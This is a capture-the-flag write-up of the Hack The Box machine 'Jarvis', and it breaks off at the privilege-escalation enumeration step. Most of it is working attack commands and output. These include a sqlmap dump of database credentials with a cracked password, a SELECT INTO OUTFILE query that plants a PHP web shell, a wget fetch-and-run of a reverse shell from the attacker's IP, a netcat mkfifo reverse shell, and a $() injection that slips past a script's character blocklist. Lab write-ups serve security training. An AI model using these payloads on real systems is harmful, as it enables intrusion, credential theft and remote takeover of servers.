# Jarvis (HACK THE BOX)

Hey Guys,Today we will be doing Jarvis from HackTheBox,
<<logo-png>>
<br/>

## Nmap Scan

```
[sarthak@sarthak ~]$ nmap -sV 10.10.10.143 -Pn -v                                                                                      
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-29 17:55 IST
NSE: Loaded 43 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 17:55
Completed Parallel DNS resolution of 1 host. at 17:55, 0.01s elapsed
Initiating Connect Scan at 17:55
Scanning 10.10.10.143 [1000 ports]
Discovered open port 22/tcp on 10.10.10.143
Discovered open port 80/tcp on 10.10.10.143
Increasing send delay for 10.10.10.143 from 0 to 5 due to 79 out of 262 dropped probes since last increase.
Completed Connect Scan at 17:56, 54.66s elapsed (1000 total ports)
Initiating Service scan at 17:56
Scanning 2 services on 10.10.10.143
Completed Service scan at 17:56, 7.18s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.143.
Initiating NSE at 17:56
Completed NSE at 17:56, 2.45s elapsed
Initiating NSE at 17:56
Completed NSE at 17:56, 0.00s elapsed
Nmap scan report for 10.10.10.143
Host is up (0.58s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.01 seconds
```
We have only 2 ports opened(well one more but it was a rabbit hole) so let's start looking at port 80

## Enumerating Web Server

<<selection009>>
<br/>
After looking around we found a good candidate for vulnerabilites like sql injection or LFI,etc

## HARVESTING CREDENTIALS

We were able to harvest credentials of admin from this following query
```
sqlmap -u "http://10.10.10.143/room.php?cod=3" --random-agent -D mysql -T user  --dump
```
and the output is :-
```
Username:-DBadmin
Password:-*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```
But this is a sha1 hash so after some hit and trial with the hash we got the value decrypted :)
<<selection010>>
<br/>

```
password:-imissyou
```

## Getting Remote Code Execution

we found ```phpmyadmin``` in dirb results
```
[sarthak@sarthak ~]$ dirb http://10.10.10.143                                                                                    [0/29]

-----------------                
DIRB v2.22                       
By The Dark Raver                
-----------------                

START_TIME: Sat Jun 29 18:00:31 2019                               
URL_BASE: http://10.10.10.143/                                     
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                   

-----------------                

GENERATED WORDS: 4612                                                                                                                  

---- Scanning URL: http://10.10.10.143/ ----                                                                                           
==> DIRECTORY: http://10.10.10.143/phpmyadmin/
```
After logging in with the credentials we got from sqlmap,We created a new database to upload shell ([Reference](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/))

<<selection 011>>
<br/>

We used the following query to create a new PHP one liner shell

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/hack.php"
```
<<selection 012>>
<br/>

We can execute commands now
<<selection 013>>
<br/>

## Low Priv Shell

We [downloaded](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) a PHP shell from here and started a listner

Now we got a shell by executing this command on our rce php file...
```
http://10.10.10.143/hack.php?cmd=wget http://10.10.15.239:8081/sh.php;php sh.php
```
<<selection 014>>
<br/>

## Pivoting to pepper user

we saw that we can execute this script ```simpler.py``` as user pepper 
```
$ python -c 'import pty;pty.spawn("/bin/bash")'                                                 
www-data@jarvis:/$ sudo -l                                                                      
sudo -l                                                                                         
Matching Defaults entries for www-data on jarvis:                                               
    env_reset, mail_badpass,                                                                    
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin               
                                                                                                
User www-data may run the following commands on jarvis:                                         
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py                                
www-data@jarvis:/$    
```

After Going through the source code we found out that if we execute this script with ```-p``` paramter, it will ask for an ip address and there we can inject our code but it have a security check which blocks some characters...

```
forbidden = ['&', ';', '-', '`', '||', '|']
```
So after googling for a while we found out [this](https://vulners.com/zdt/1337DAY-ID-28868),So according to this we can execute commands inside `$(commands)` and it will bypass those checks...

So we downloaded a ```shell.sh```  on the server which has netcat reverse shell in it ...
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.239 1233 >/tmp/f
```

and upon executing this command we get a reverse connection
```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```
then it asks for a IP address and we executed this command to get shell
```
$(sh /var/www/html/shell.sh)
```
<<workspace_15>>
<br/>

## Privesc

Upon executing this ``` find / -perm -u=s -type f 2>/dev/null ``` command we found out that ```systemctl``` will run as root 

```
pepper@jarvis:/var/www$ find / -perm -u=s -type f 2>/dev/null 
find / -perm -u=s -type f 2>/dev/null 
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
pepper@jarvis:/var/www$ 

```


